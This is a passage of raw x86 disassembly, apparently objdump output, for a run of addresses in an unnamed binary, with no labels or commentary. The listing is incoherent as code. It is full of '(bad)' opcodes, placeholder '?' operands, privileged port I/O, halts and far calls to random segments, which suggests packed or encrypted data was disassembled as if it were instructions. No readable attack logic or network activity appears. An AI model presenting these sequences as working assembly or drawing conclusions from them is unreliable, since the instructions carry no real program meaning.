  4143e2:	dec    ebx
  4143e3:	dec    ebp
  4143e4:	jg     0x4143d4
  4143e6:	aaa    
  4143e7:	in     al,0xa0
  4143e9:	aad    0xdb
  4143eb:	xchg   ecx,eax
  4143ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143ed:	mov    eax,0x4da03457
  4143f2:	and    DWORD PTR [ebp+0xc],esp
  4143f5:	sub    al,0xf6
  4143f7:	daa    
  4143f8:	mov    esp,0xe7040999
  4143fd:	pushf  
  4143fe:	push   edi
  4143ff:	adc    eax,ebx
  414401:	pop    eax
  414402:	not    BYTE PTR [esi-0x37]
  414405:	clc    
  414406:	mov    dh,BYTE PTR [ecx+esi*8]
  414409:	or     esp,ebp
  41440b:	sbb    edx,DWORD PTR [eax-0x474859cb]
  414411:	xor    BYTE PTR [eax],dh
  414413:	push   ebx
  414414:	cld    
  414415:	and    BYTE PTR [eax+ebx*2+0x727585c3],bl
  41441c:	adc    eax,0x584242d8
  414421:	ror    BYTE PTR [ecx+0x2fac5a7d],1
  414427:	fidivr WORD PTR [edi-0x157df747]
  41442d:	fcmovb st,st(3)
  41442f:	mov    eax,0xb36fcc7e
  414434:	imul   ebp,DWORD PTR [esi+0x62],0xffffffe2
  414438:	int    0xd7
  41443a:	sbb    esp,DWORD PTR [eax]
  41443c:	fsub   DWORD PTR [edx+ecx*2-0x2d]
  414440:	xlat   BYTE PTR ds:[ebx]
  414441:	cli    
  414442:	out    dx,al
  414443:	mov    es,eax
  414445:	(bad)  
  414447:	in     al,dx
  414448:	xchg   ebp,eax
  414449:	add    BYTE PTR es:[edx],0xb8
  41444d:	dec    ebx
  41444e:	dec    ebx
  41444f:	(bad)  
  414450:	adc    eax,0xc8b3e4e9
  414455:	mov    al,ds:0x4b33108
  41445a:	adc    edx,0xa7022c3d
  414460:	inc    esi
  414461:	xor    BYTE PTR [esi-0x6221e577],dl
  414467:	leave  
  414468:	addr16 ds ss mov ebx,0xe06bd3ed
  414470:	sub    DWORD PTR es:[ebx],0xfffffff9
  414474:	scas   al,BYTE PTR es:[edi]
  414475:	bound  esi,QWORD PTR [ebp-0x67649e6b]
  41447b:	push   eax
  41447c:	ret    0x1db7
  41447f:	mov    al,ds:0xc95dc01e
  414484:	inc    ebx
  414485:	jp     0x41447f
  414487:	mov    al,0x1f
  414489:	enter  0x648b,0x5c
  41448d:	ss pop edi
  41448f:	mov    cl,0x14
  414491:	dec    edx
  414492:	sbb    cl,BYTE PTR [ebx+0x655829b1]
  414498:	pop    ebp
  414499:	or     DWORD PTR [ebp+edi*2-0x7ff19671],ecx
  4144a0:	jne    0x414515
  4144a2:	aad    0xee
  4144a4:	int3   
  4144a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144a6:	xlat   BYTE PTR ds:[ebx]
  4144a7:	jl     0x414516
  4144a9:	push   edx
  4144aa:	or     esi,edx
  4144ac:	scas   al,BYTE PTR es:[edi]
  4144ad:	and    DWORD PTR [eax+ebp*8],ebx
  4144b0:	mov    ebx,0x273d71b7
  4144b5:	retf   
  4144b6:	int3   
  4144b7:	iret   
  4144b8:	out    dx,al
  4144b9:	cmp    ah,BYTE PTR [ecx+0x19]
  4144bc:	repnz or edi,DWORD PTR [esp+ebx*2-0x49878e44]
  4144c4:	dec    edx
  4144c5:	in     al,dx
  4144c6:	fistp  QWORD PTR [edx-0x2a2ad987]
  4144cc:	scas   al,BYTE PTR es:[edi]
  4144cd:	xor    DWORD PTR [ebp-0x5ace9f3],ebp
  4144d3:	mov    bl,BYTE PTR [ecx+0x3d41dfe8]
  4144d9:	(bad)  
  4144db:	iret   
  4144dc:	les    esp,FWORD PTR [edi+0x3]
  4144df:	into   
  4144e0:	pop    esp
  4144e1:	pop    esp
  4144e2:	sub    eax,DWORD PTR [edx-0x66]
  4144e5:	mov    WORD PTR [eax+ebx*8-0x4c46e4bf],gs
  4144ec:	arpl   WORD PTR [ebx],ax
  4144ee:	cmc    
  4144ef:	inc    esp
  4144f0:	inc    esp
  4144f1:	pop    ebx
  4144f2:	stc    
  4144f3:	sar    cl,1
  4144f5:	(bad)  
  4144f6:	lahf   
  4144f7:	fcom   DWORD PTR [esi]
  4144f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144fa:	cwd    
  4144fc:	push   edx
  4144fd:	das    
  4144fe:	dec    ecx
  4144ff:	jae    0x414551
  414501:	xchg   esp,eax
  414502:	push   edx
  414503:	hlt    
  414504:	jns    0x41451d
  414506:	pop    ebx
  414507:	cmp    BYTE PTR [esi+0x11],0x8f
  41450b:	dec    eax
  41450c:	cmp    eax,DWORD PTR [ecx-0x29]
  41450f:	pop    ebx
  414510:	adc    al,0x4c
  414512:	and    esp,DWORD PTR ds:[ecx+0x29]
  414516:	retf   0xa079
  414519:	out    0xb3,al
  41451b:	xor    dl,bh
  41451d:	jne    0x41458c
  41451f:	sti    
  414520:	call   0xdc72:0xa219ad00
  414527:	push   edx
  414528:	sahf   
  414529:	xor    DWORD PTR [edx+0x63039604],ecx
  41452f:	push   ds
  414530:	xchg   edi,eax
  414531:	inc    ebp
  414532:	jecxz  0x41451b
  414534:	bound  ecx,QWORD PTR [edi]
  414536:	mov    dh,0xd1
  414538:	jno    0x4144fd
  41453a:	sahf   
  41453b:	adc    al,BYTE PTR [ebp+0x386a27cc]
  414541:	mov    BYTE PTR [ebp-0x707fa3e5],bl
  414547:	jl     0x4145ac
  414549:	stos   DWORD PTR es:[edi],eax
  41454a:	fcmovnb st,st(3)
  41454c:	pop    esi
  41454d:	aas    
  41454e:	fiadd  DWORD PTR [edi-0x707c7afe]
  414554:	inc    eax
  414555:	inc    ebx
  414556:	test   cl,bl
  414558:	int    0x44
  41455a:	and    eax,0xa1aa1e86
  41455f:	in     eax,0xe2
  414561:	xchg   edx,eax
  414562:	popf   
  414563:	test   DWORD PTR [esi-0xe1f30b1],edi
  414569:	leave  
  41456a:	or     esp,esp
  41456c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41456d:	pushf  
  41456e:	repz adc bh,ch
  414571:	add    BYTE PTR [edx],ah
  414573:	shld   DWORD PTR [eax+0x33],ecx,0xb1
  414578:	xor    ebp,0xffffff89
  41457b:	push   esi
  41457c:	das    
  41457d:	je     0x414526
  41457f:	ret    
  414580:	mov    edx,0x3fc98d04
  414585:	xchg   esi,eax
  414586:	outs   dx,DWORD PTR ss:[esi]
  414588:	cdq    
  414589:	lods   eax,DWORD PTR ds:[esi]
  41458a:	sbb    eax,DWORD PTR [edx]
  41458c:	out    0x69,al
  41458e:	test   eax,0x15248f60
  414593:	mov    dl,0x77
  414595:	lea    esp,[ecx+0x3ebd0923]
  41459b:	sar    BYTE PTR [esi+0x64ed3b3c],0xb5
  4145a2:	lds    edx,FWORD PTR [esi]
  4145a4:	test   edx,esi
  4145a6:	sti    
  4145a7:	mov    ebp,0xf0dc4f85
  4145ac:	xor    dh,cl
  4145ae:	cdq    
  4145af:	scas   eax,DWORD PTR es:[edi]
  4145b0:	push   edi
  4145b1:	outs   dx,DWORD PTR ds:[esi]
  4145b2:	sti    
  4145b3:	mov    bp,0x13e3
  4145b7:	or     DWORD PTR [ecx+eax*2+0x416b668f],esp
  4145be:	or     dl,BYTE PTR [ebp-0x12]
  4145c1:	les    ebx,FWORD PTR [eax+0x7b]
  4145c4:	sub    dl,BYTE PTR ds:[ebp+0x5644e416]
  4145cb:	xchg   edx,eax
  4145cc:	sbb    ebp,DWORD PTR [esi+ebx*8-0x196c4d06]
  4145d3:	jne    0x414595
  4145d5:	push   0x48
  4145d7:	xchg   edi,eax
  4145d8:	arpl   WORD PTR [eax-0x3b75900d],cx
  4145de:	fist   DWORD PTR [eax+0x25]
  4145e1:	mov    eax,ds:0x914f4a4d
  4145e6:	pop    edi
  4145e7:	jmp    0xe1f21401
  4145ec:	das    
  4145ed:	imul   edx,DWORD PTR [eax-0x64],0xdff19041
  4145f4:	xchg   edx,eax
  4145f5:	(bad)  
  4145f7:	nop
  4145f8:	adc    BYTE PTR [edi],ah
  4145fa:	fstp   QWORD PTR [edx+0x59]
  4145fd:	add    DWORD PTR [edx],ebp
  4145ff:	add    DWORD PTR [esi],0xffffffc4
  414602:	sub    ah,BYTE PTR [edx-0x34449d93]
  414608:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414609:	les    esi,FWORD PTR [edx-0x53]
  41460c:	xchg   esp,eax
  41460d:	mov    bl,0x50
  41460f:	adc    al,0x85
  414611:	sbb    ebp,eax
  414613:	inc    edi
  414614:	add    al,0x56
  414616:	in     eax,0x34
  414618:	xor    ecx,DWORD PTR [edi]
  41461a:	test   ch,bh
  41461c:	xchg   ebp,eax
  41461d:	outs   dx,DWORD PTR ds:[esi]
  41461e:	sub    al,0x7f
  414620:	jae    0x414637
  414622:	(bad)  
  414623:	int3   
  414624:	ja     0x41463b
  414626:	ja     0x4145c4
  414628:	mov    eax,ds:0x56696808
  41462d:	xor    al,ch
  41462f:	je     0x41467d
  414631:	cmp    al,0x17
  414633:	pop    eax
  414634:	js     0x414663
  414636:	ss add ebp,0xf528b0db
  41463d:	ror    DWORD PTR [edx+0x8],0xb3
  414641:	xchg   esp,eax
  414642:	imul   edx,DWORD PTR [ecx],0xffffffc7
  414645:	cmp    al,0xb3
  414647:	sub    eax,0xa6f21c1d
  41464c:	or     eax,0x5ad3a924
  414651:	push   ebp
  414652:	mov    ds:0x6eedc69d,eax
  414657:	mov    esp,0xe311e832
  41465c:	xor    BYTE PTR [ecx-0x5a],al
  41465f:	push   0x9ea9c1df
  414664:	xor    ah,dl
  414666:	push   ds
  414667:	mul    DWORD PTR [ebx-0x521df08f]
  41466d:	mov    ebx,0x80e5f5d9
  414672:	call   0x119a4e38
  414677:	sub    al,BYTE PTR ds:0xc1b64cb9
  41467d:	push   ebp
  41467e:	(bad)  
  41467f:	adc    ch,ah
  414681:	cmp    cl,BYTE PTR [eax]
  414683:	ficomp WORD PTR [esi+0x77]
  414686:	pop    esi
  414687:	adc    al,0x3
  414689:	cmp    DWORD PTR [eax+ecx*4-0x66cf2955],ebp
  414690:	mov    ebp,0xe9171af3
  414695:	sahf   
  414696:	add    BYTE PTR [ebp-0x68],al
  414699:	add    esp,DWORD PTR [edi+0x2b]
  41469c:	push   cs
  41469d:	jae    0x41471b
  41469f:	lds    ecx,FWORD PTR [ebp+eax*1+0x17]
  4146a3:	add    al,BYTE PTR [eax]
  4146a5:	imul   ebp,edx,0xffffffc1
  4146a8:	jmp    0xa80c:0xb56f6a10
  4146af:	jmp    0x2b76548e
  4146b4:	outs   dx,BYTE PTR ds:[esi]
  4146b5:	add    eax,0xd3566b6c
  4146ba:	dec    edi
  4146bb:	clc    
  4146bc:	adc    DWORD PTR [ebp-0x10],eax
  4146bf:	mov    al,ds:0x165fef04
  4146c4:	stos   DWORD PTR es:[edi],eax
  4146c5:	mov    ebx,0x89c5e507
  4146ca:	popa   
  4146cb:	or     BYTE PTR [esi+0x62],bh
  4146ce:	cld    
  4146cf:	fild   QWORD PTR [edx]
  4146d1:	pop    ss
  4146d2:	pop    ecx
  4146d3:	ret    
  4146d4:	jbe    0x41471a
  4146d6:	mov    dh,0xf5
  4146d8:	pop    ebp
  4146d9:	mov    WORD PTR [esi],gs
  4146db:	xor    eax,0xef5219df
  4146e0:	push   ss
  4146e1:	xchg   esp,eax
  4146e2:	dec    esi
  4146e3:	cli    
  4146e4:	sbb    BYTE PTR [edi+0x22],al
  4146e7:	and    al,0x78
  4146e9:	jbe    0x41475e
  4146eb:	ret    
  4146ec:	adc    DWORD PTR [ecx],edx
  4146ee:	inc    esp
  4146ef:	xor    DWORD PTR [edx],0x4d
  4146f2:	add    bl,BYTE PTR [eax+0x50]
  4146f5:	jb     0x41467d
  4146f7:	jmp    0x414681
  4146f9:	fsubr  DWORD PTR [eax-0x63e673b8]
  4146ff:	sahf   
  414700:	cld    
  414701:	mov    esi,0x67bc2f55
  414706:	push   ds
  414707:	shl    BYTE PTR ds:0x8ead1f4d,0xc3
  41470e:	mov    esi,DWORD PTR [edi*1-0x70eb68b1]
  414715:	sub    BYTE PTR [ebx-0x611cba6c],cl
  41471b:	xchg   esp,eax
  41471c:	adc    BYTE PTR [edi+0x15],0xf6
  414720:	mov    cl,0x2
  414722:	cs mov ecx,eax
  414725:	das    
  414726:	jmp    0x41479b
  414728:	popf   
  414729:	stos   BYTE PTR es:[edi],al
  41472a:	jb     0x41474e
  41472c:	jbe    0x4146ec
  41472e:	scas   eax,DWORD PTR es:[edi]
  41472f:	scas   eax,DWORD PTR es:[edi]
  414730:	outs   dx,BYTE PTR ds:[esi]
  414731:	and    esi,edi
  414733:	call   0x985d9af0
  414738:	jmp    0x414775
  41473a:	xor    eax,0x47fb7634
  41473f:	arpl   cx,bp
  414741:	cmp    eax,0xfb68648c
  414746:	push   edi
  414747:	push   esi
  414748:	push   ebx
  414749:	test   al,0xd3
  41474b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41474c:	iret   
  41474d:	lea    eax,ds:0x7571210b
  414753:	add    eax,0xa2eeb132
  414758:	cmp    bh,BYTE PTR [edx+0xf]
  41475b:	and    al,0xba
  41475d:	pushf  
  41475e:	ss dec edx
  414760:	(bad)  
  414761:	das    
  414762:	and    bl,bl
  414764:	cld    
  414765:	lods   al,BYTE PTR ds:[esi]
  414766:	inc    ecx
  414767:	jmp    0x41474a
  414769:	jg     0x414769
  41476b:	fst    DWORD PTR [edx-0x41]
  41476e:	imul   ebx,DWORD PTR [esi],0xfa9df586
  414774:	outs   dx,DWORD PTR ss:[esi]
  414776:	arpl   WORD PTR [edx-0x59],di
  414779:	leave  
  41477a:	mov    al,0xd5
  41477c:	shl    DWORD PTR [eax-0x64],0x14
  414780:	mov    edx,0x36a80ea4
  414785:	jne    0x4147b9
  414787:	add    bl,BYTE PTR [edx+0x23]
  41478a:	iret   
  41478b:	aam    0x4d
  41478d:	loop   0x4147a0
  41478f:	jge    0x414793
  414791:	mov    bh,BYTE PTR [ebx+0x528c0167]
  414797:	scas   al,BYTE PTR es:[edi]
  414798:	push   0xd554cb2f
  41479d:	rol    DWORD PTR [esi+0x7a],0x5b
  4147a1:	mov    edi,0xab17385d
  4147a6:	sti    
  4147a7:	jbe    0x414758
  4147a9:	pop    ebx
  4147aa:	stos   DWORD PTR es:[edi],eax
  4147ab:	pusha  
  4147ac:	push   edx
  4147ad:	in     al,dx
  4147ae:	loope  0x414804
  4147b0:	jmp    0x4147d5
  4147b2:	int3   
  4147b3:	adc    ebx,DWORD PTR [edi]
  4147b5:	imul   edx,DWORD PTR [ebp+0x12],0x11
  4147b9:	and    edi,ebp
  4147bb:	aaa    
  4147bc:	xor    al,0xf4
  4147be:	ins    BYTE PTR es:[edi],dx
  4147bf:	out    0x93,eax
  4147c1:	jo     0x4147e9
  4147c3:	push   es
  4147c4:	aad    0xe3
  4147c6:	jl     0x41481f
  4147c8:	sub    edx,DWORD PTR [ebx]
  4147ca:	and    eax,ebp
  4147cc:	(bad)  
  4147cd:	mov    ds:0xfb0b96b5,eax
  4147d2:	push   0x9a4f5572
  4147d7:	pop    ebp
  4147d8:	pop    esp
  4147d9:	mov    DWORD PTR [ebx-0x24],eax
  4147dc:	data16 shl BYTE PTR [eax+edx*4-0x37ace65c],cl
  4147e4:	(bad)  
  4147e5:	jg     0x4147db
  4147e7:	mov    DWORD PTR [esi-0x74],edi
  4147ea:	push   eax
  4147eb:	leave  
  4147ec:	retf   
  4147ed:	call   0x33bc:0x35da6ff0
  4147f4:	sub    ah,BYTE PTR [eax+eax*8-0x5f2b0e96]
  4147fb:	ins    DWORD PTR es:[edi],dx
  4147fc:	ss fxch st(0)
  4147ff:	fisubr DWORD PTR [edi-0x6]
  414802:	mov    ch,0x53
  414804:	in     al,0x5c
  414806:	arpl   WORD PTR [ebx],dx
  414808:	popa   
  414809:	dec    eax
  41480a:	adc    edx,eax
  41480c:	rol    BYTE PTR [eax-0x7d],cl
  41480f:	mov    bh,0xd
  414811:	push   es
  414812:	adc    eax,0x5f037a01
  414817:	mov    dx,0x4f0
  41481b:	jnp    0x414821
  41481d:	and    esi,DWORD PTR [ebx+0x7afcfc00]
  414823:	mov    bl,0x70
  414825:	and    bh,BYTE PTR [ecx]
  414827:	jns    0x414810
  414829:	shl    BYTE PTR gs:[esi+0x5e107437],0x7b
  414831:	fs sub eax,0x33a77793
  414837:	rol    BYTE PTR [ebx+ecx*8+0x7cb8ec85],cl
  41483e:	and    al,0x5a
  414840:	clc    
  414841:	and    al,0xe1
  414843:	inc    edi
  414844:	dec    ecx
  414845:	pop    esi
  414846:	inc    ebx
  414847:	dec    esi
  414848:	jle    0x414868
  41484a:	out    dx,eax
  41484b:	rcl    ah,cl
  41484d:	push   0x525e1515
  414852:	and    al,0xfc
  414854:	mov    eax,ds:0xd0c4885b
  414859:	call   0xae39:0x9e1c1daa
  414860:	aam    0x6b
  414862:	add    BYTE PTR [bx+di-0x326c],dl
  414867:	ins    BYTE PTR es:[edi],dx
  414868:	lea    edx,[ebx-0x2d]
  41486b:	(bad)  
  41486c:	push   ebp
  41486d:	mov    esp,0x8467a9fc
  414872:	(bad)  
  414873:	sub    ebp,DWORD PTR [ebx+0x4e511da5]
  414879:	fbld   TBYTE PTR [eax]
  41487b:	test   DWORD PTR [esi+0x1d935049],0xd30bb762
  414885:	mov    dl,0x3
  414887:	arpl   WORD PTR [ebx+0x75],si
  41488a:	or     BYTE PTR [edi],bh
  41488c:	add    ebp,DWORD PTR [ebp-0x15a1d236]
  414892:	mov    bl,BYTE PTR [edx+eax*4]
  414895:	and    al,BYTE PTR [esi+edi*1-0x779177ac]
  41489c:	mov    BYTE PTR [ebx],dl
  41489e:	adc    al,0x29
  4148a0:	dec    ebp
  4148a1:	adc    BYTE PTR [edi+0x51617fc7],bl
  4148a7:	inc    esp
  4148a8:	pop    esi
  4148a9:	adc    DWORD PTR ds:0xdd43b856,0xf0911f64
  4148b3:	sbb    BYTE PTR ss:[esi],dl
  4148b6:	push   esi
  4148b7:	push   ss
  4148b8:	sbb    eax,DWORD PTR [esi-0x9609969]
  4148be:	call   0xc50e:0xf253e3d5
  4148c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148c6:	mov    eax,ds:0x46b0e88c
  4148cb:	xor    dh,BYTE PTR [esp+ebx*2-0x2772fcb8]
  4148d2:	les    edi,FWORD PTR [ebx+0x2290459a]
  4148d8:	and    ax,0x1ede
  4148dc:	fs jle 0x4148b5
  4148df:	sub    bh,BYTE PTR [eax+0x6fe5ce1d]
  4148e5:	sub    BYTE PTR [ebx-0x3027648f],0x82
  4148ec:	mov    dl,0x10
  4148ee:	xor    esp,DWORD PTR [edx+0x144be321]
  4148f4:	jns    0x414968
  4148f6:	push   edi
  4148f7:	in     eax,dx
  4148f8:	ret    0x1fe9
  4148fb:	jp     0x4148ea
  4148fd:	cmp    al,al
  4148ff:	pop    esp
  414900:	xchg   DWORD PTR [esi+0x3dc59927],edx
  414906:	jae    0x4148a3
  414908:	sahf   
  414909:	sub    ah,BYTE PTR [ecx+0x6621fa0a]
  41490f:	fdiv   st,st(1)
  414911:	push   es
  414912:	dec    ecx
  414913:	call   0x6ba578e5
  414918:	add    DWORD PTR [ebx+0x53],ebx
  41491b:	fnstcw WORD PTR [edx+0x4f21775f]
  414921:	xlat   BYTE PTR ds:[ebx]
  414922:	inc    ebx
  414923:	pop    ds
  414924:	mov    dl,0x97
  414926:	inc    ecx
  414927:	mov    ebx,0x389e159
  41492c:	repnz sbb DWORD PTR [ebp+0x4b184a02],edx
  414933:	inc    edi
  414934:	inc    esi
  414935:	jo     0x414967
  414937:	sub    ch,dh
  414939:	adc    eax,0x91021cac
  41493e:	sub    DWORD PTR [eax+0x4c],esi
  414941:	in     al,0xa
  414943:	sahf   
  414944:	fimul  DWORD PTR [edi-0x7]
  414947:	mov    al,0xde
  414949:	call   0xa51b:0xc2e5d613
  414950:	jmp    0x4149b8
  414952:	pusha  
  414953:	sti    
  414954:	mov    ebx,edx
  414956:	fcom   DWORD PTR [esi-0x27]
  414959:	xchg   DWORD PTR [edx+edx*2+0x745e3bf3],esi
  414960:	adc    al,0xa9
  414962:	sbb    al,cl
  414964:	and    bl,ch
  414966:	lds    ebp,FWORD PTR ds:0x7d44d4d7
  41496c:	callw  0xb6e3
  414970:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414971:	push   edi
  414972:	or     eax,0x3859894e
  414977:	pop    esp
  414978:	mov    esp,0xdcc79fc9
  41497d:	cmp    eax,0xe945478a
  414982:	dec    esi
  414983:	in     eax,0xb9
  414985:	stos   BYTE PTR es:[edi],al
  414986:	ins    BYTE PTR es:[edi],dx
  414987:	mov    al,ds:0xe1020aed
  41498c:	push   esp
  41498d:	xor    ch,0x50
  414990:	mov    DWORD PTR ds:0x5a74ab5d,edi
  414996:	fdivr  st,st(6)
  414998:	add    ah,bl
  41499a:	push   ebp
  41499b:	sub    ecx,DWORD PTR [ecx+eax*8]
  41499e:	pop    ebp
  41499f:	in     al,0xa7
  4149a1:	ret    0x6de5
  4149a4:	aam    0x2
  4149a6:	xor    DWORD PTR [ebx],ebp
  4149a8:	mov    eax,0x62c79ebb
  4149ad:	sbb    BYTE PTR [esi+edx*8+0x3d1964a8],bh
  4149b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149b5:	xchg   ecx,eax
  4149b6:	ficom  WORD PTR [edx]
  4149b8:	(bad)  
  4149b9:	rol    BYTE PTR [ebp-0xa],0x22
  4149bd:	add    DWORD PTR [ebp-0x15f5c2e5],esp
  4149c3:	not    DWORD PTR [edx+0x7]
  4149c6:	xor    ebx,DWORD PTR [edx]
  4149c8:	adc    edi,esi
  4149ca:	ret    0x87eb
  4149cd:	jmp    0x9041:0xefa2124e
  4149d4:	retf   
  4149d5:	jnp    0x41497f
  4149d7:	or     BYTE PTR [eax],cl
  4149d9:	clc    
  4149da:	adc    ebp,DWORD PTR [esi+ebp*2-0x3]
  4149de:	or     edx,DWORD PTR [ebp+0x43]
  4149e1:	jae    0x4149a4
  4149e3:	scas   al,BYTE PTR es:[edi]
  4149e4:	xor    dh,bl
  4149e6:	and    dh,BYTE PTR [edi+0x60bae193]
  4149ec:	es push esi
  4149ee:	ret    
  4149ef:	jg     0x4149d8
  4149f1:	mov    WORD PTR [edi-0x4a],?
  4149f4:	bound  edx,QWORD PTR [ecx]
  4149f6:	and    DWORD PTR [ebx],edx
  4149f8:	pusha  
  4149f9:	call   0xa99d:0x8934b580
  414a00:	jg     0x4149cc
  414a02:	popa   
  414a03:	pop    ebp
  414a04:	test   eax,0x8c45d92c
  414a09:	mov    cs,eax
  414a0b:	cs imul edx,edx,0x6952d3e8
  414a12:	sbb    BYTE PTR [ecx-0x16],cl
  414a15:	je     0x414a8e
  414a17:	ins    DWORD PTR es:[edi],dx
  414a18:	fsubr  DWORD PTR [ebp-0x90f551]
  414a1e:	in     eax,dx
  414a1f:	fcom   QWORD PTR [ecx-0x74]
  414a22:	fadd   DWORD PTR [ebp-0x7831eb00]
  414a28:	add    edx,DWORD PTR [ecx]
  414a2a:	lock mov BYTE PTR ss:[esi+eiz*2+0x25],bl
  414a30:	call   DWORD PTR [ecx]
  414a32:	mov    gs,WORD PTR [edi]
  414a34:	iret   
  414a35:	mov    ebp,0x83345ef3
  414a3a:	pop    edx
  414a3b:	lahf   
  414a3c:	and    dl,BYTE PTR [esi-0xd9fa816]
  414a42:	retf   
  414a43:	mov    ebp,0x10476361
  414a48:	and    eax,0x9648aa80
  414a4d:	lods   eax,DWORD PTR ds:[esi]
  414a4e:	jbe    0x414a47
  414a50:	ss mov ch,0x8
  414a53:	xchg   esp,eax
  414a54:	mov    al,BYTE PTR [edi]
  414a56:	xchg   DWORD PTR [ecx],ebp
  414a58:	sub    ecx,esi
  414a5a:	shl    BYTE PTR [eax],0x57
  414a5d:	jbe    0x414a7e
  414a5f:	mov    al,0x37
  414a61:	pusha  
  414a62:	xor    esi,0x92550478
  414a68:	cmp    dl,ah
  414a6a:	jo     0x414a5d
  414a6c:	mov    eax,ds:0x1cd2884e
  414a71:	loopne 0x414a23
  414a73:	sub    cl,BYTE PTR [ebx-0x39cc1bab]
  414a79:	jmp    0x416dee
  414a7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a7f:	xchg   esi,eax
  414a80:	retf   
  414a81:	dec    eax
  414a82:	mov    esp,edi
  414a84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a85:	xchg   esp,eax
  414a86:	dec    ecx
  414a87:	(bad)  
  414a88:	mov    ah,0x80
  414a8a:	(bad)  
  414a8b:	and    BYTE PTR [esi],dh
  414a8d:	sbb    ebp,edi
  414a8f:	inc    edi
  414a90:	popa   
  414a91:	bound  ecx,QWORD PTR [edx]
  414a93:	pop    edi
  414a94:	bound  esp,QWORD PTR [edx+0x7a]
  414a97:	adc    eax,0x2f0ed0e5
  414a9c:	dec    eax
  414a9d:	jnp    0x414a3f
  414a9f:	mov    al,ds:0x8921a068
  414aa4:	xchg   edi,eax
  414aa5:	stos   DWORD PTR es:[edi],eax
  414aa6:	xlat   BYTE PTR ds:[ebx]
  414aa7:	mov    esi,ss
  414aa9:	rcr    BYTE PTR [edi],0x3a
  414aac:	mov    cl,0xa0
  414aae:	imul   ebx,DWORD PTR [eax-0x84ef941],0x64d9f554
  414ab8:	sti    
  414ab9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414aba:	retf   
  414abb:	adc    DWORD PTR [eax],esi
  414abd:	shr    edi,cl
  414abf:	sahf   
  414ac0:	cli    
  414ac1:	pushf  
  414ac2:	mov    al,ds:0xd9f5142a
  414ac7:	jl     0x414b02
  414ac9:	mov    edi,edx
  414acb:	or     edx,DWORD PTR [eax+0x523a2cba]
  414ad1:	cmp    dl,dl
  414ad3:	mov    eax,0xc22f5d03
  414ad8:	shr    BYTE PTR [edi+0x28],0xd3
  414adc:	add    eax,0x2ddc5bd0
  414ae1:	fstp   st(1)
  414ae3:	aas    
  414ae4:	les    ebx,FWORD PTR [ebx-0x75]
  414ae7:	xlat   BYTE PTR ds:[ebx]
  414ae8:	mov    bl,0x81
  414aea:	aad    0xcb
  414aec:	mov    dh,0xb2
  414aee:	mov    al,ds:0x6d154a1f
  414af3:	fwait
  414af4:	jge    0x414b75
  414af6:	pop    esp
  414af7:	mov    ah,0x8a
  414af9:	dec    esp
  414afa:	xchg   ecx,eax
  414afb:	xlat   BYTE PTR ds:[ebx]
  414afc:	cld    
  414afd:	into   
  414afe:	int    0x8b
  414b00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b01:	mov    esp,0x469b5c7b
  414b06:	fnsave [ecx]
  414b08:	mov    esp,ebp
  414b0a:	mov    dl,0xd2
  414b0c:	int    0x7d
  414b0e:	pop    eax
  414b0f:	hlt    
  414b10:	mov    esi,0x373c8f2d
  414b15:	scas   eax,DWORD PTR es:[edi]
  414b16:	loop   0x414b49
  414b18:	push   cs
  414b19:	in     eax,dx
  414b1a:	aaa    
  414b1b:	pop    edx
  414b1c:	push   ebx
  414b1d:	dec    edi
  414b1e:	loop   0x414b93
  414b20:	pusha  
  414b21:	mov    ebp,0x2f48f871
  414b26:	js     0x414ab4
  414b28:	arpl   WORD PTR [esi+0x7e],bx
  414b2b:	loop   0x414b34
  414b2d:	cdq    
  414b2e:	cmp    edi,DWORD PTR [edx-0x65]
  414b31:	and    ch,BYTE PTR [edi+esi*8+0x7cb28db3]
  414b38:	mov    ?,esi
  414b3a:	jb     0x414b05
  414b3c:	loop   0x414ac5
  414b3e:	mov    dh,0x49
  414b40:	daa    
  414b41:	xor    eax,DWORD PTR [edx-0x36]
  414b44:	push   esi
  414b45:	and    DWORD PTR [edi],0xffffffd5
  414b48:	jmp    0x414afb
  414b4a:	xor    BYTE PTR [edi],0xc7
  414b4d:	push   esi
  414b4e:	dec    edx
  414b4f:	mov    edi,0xa308ca48
  414b54:	js     0x414ae8
  414b56:	jecxz  0x414bba
  414b58:	sbb    DWORD PTR [esi+eiz*4-0x34],ebx
  414b5c:	dec    ebx
  414b5d:	inc    esp
  414b5e:	sti    
  414b5f:	pop    edi
  414b60:	pop    ds
  414b61:	xor    eax,0x6772dc88
  414b66:	jge    0x414af2
  414b68:	mov    ebp,0x26df10dd
  414b6d:	out    0xfe,eax
  414b6f:	push   0xa1060a0d
  414b74:	push   ecx
  414b75:	mov    ?,WORD PTR [ecx]
  414b77:	xchg   edx,eax
  414b78:	pop    esi
  414b79:	std    
  414b7a:	imul   BYTE PTR [edx+0x75544b65]
  414b80:	ffreep st(6)
  414b82:	ds hlt 
  414b84:	push   cs
  414b85:	sub    eax,0x3887b531
  414b8a:	dec    ah
  414b8c:	aaa    
  414b8d:	sub    esp,DWORD PTR [esi+ecx*4+0x51]
  414b91:	jb     0x414c09
  414b93:	mov    bl,0x2d
  414b95:	dec    ebx
  414b96:	pop    ebp
  414b97:	cmc    
  414b98:	dec    ebx
  414b99:	into   
  414b9a:	data16 sti 
  414b9c:	mov    dl,0x57
  414b9e:	push   ds
  414b9f:	and    al,0xa4
  414ba1:	dec    edi
  414ba2:	test   eax,0xcaabad05
  414ba7:	fwait
  414ba8:	retf   
  414ba9:	dec    ebx
  414baa:	repz arpl WORD PTR [eax],dx
  414bad:	cld    
  414bae:	lods   eax,DWORD PTR ds:[esi]
  414baf:	sbb    esp,ebx
  414bb1:	add    eax,0xbd7a41d6
  414bb6:	mov    dl,0xbe
  414bb8:	in     eax,dx
  414bb9:	mov    ds:0x2bf478d1,al
  414bbe:	(bad)  
  414bbf:	out    0xd3,eax
